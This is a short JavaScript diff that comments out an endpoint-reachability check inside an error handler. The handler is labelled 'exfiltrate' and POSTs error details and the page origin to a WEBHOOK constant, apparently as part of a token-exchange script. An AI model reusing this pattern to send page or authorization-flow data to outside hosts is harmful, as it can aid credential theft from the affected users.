@@ -53,13 +53,13 @@
                 });
             } catch (error) {
                 // 8. Catch and exfiltrate any errors (CORS blocks, DNS resolution errors, network drops)
-                let endpointReachable;
-                try {
-                    await fetch(TOKEN_URL, { mode: "no-cors" }); // GET: does not burn the code
-                    endpointReachable = true;
-                } catch {
-                    endpointReachable = false;
-                }
+                // let endpointReachable;
+                // try {
+                //     await fetch(TOKEN_URL, { mode: "no-cors" }); // GET: does not burn the code
+                //     endpointReachable = true;
+                // } catch {
+                //     endpointReachable = false;
+                // }
 
                 await fetch(WEBHOOK, {
                     method: "POST",
@@ -70,10 +70,10 @@
                         message: error.message,
                         stack: error.stack,
                         isTypeError: error instanceof TypeError,
-                        endpointReachable,
-                        verdict: endpointReachable
-                            ? "reachable -> CORS/header block (check DevTools console)"
-                            : "unreachable -> DNS/TLS/network failure",
+                        // endpointReachable,
+                        // verdict: endpointReachable
+                        //     ? "reachable -> CORS/header block (check DevTools console)"
+                        //     : "unreachable -> DNS/TLS/network failure",
                         origin: location.origin,
                     }),
                 });
